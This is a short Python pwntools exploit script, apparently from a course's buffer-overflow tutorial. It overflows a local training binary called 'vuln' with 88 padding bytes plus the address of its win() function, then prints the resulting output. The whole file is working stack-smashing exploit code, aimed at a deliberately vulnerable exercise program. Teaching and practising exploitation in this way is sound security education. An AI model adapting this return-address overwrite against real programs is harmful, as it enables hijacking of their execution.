#!/usr/bin/env python

from pwn import *

exec_path = "../../06-tutorial-buffer-overflow/src/vuln"
context.binary = exec_path
e = ELF(exec_path)
io = process(exec_path)

log.info("context is: " + str(vars(context)))

win_address = e.symbols["win"]
log.info("win() address is 0x{:0x}".format(win_address))

# Determine this with GDB PEDA + pattc + patto.
offset = 88

# Create payload.
payload = "A" * offset + pack(win_address)

# Feed payload as input to program.
io.sendline(payload)

# Receive everything (including the "Congrats!" message).
msg = io.recvall()
print msg
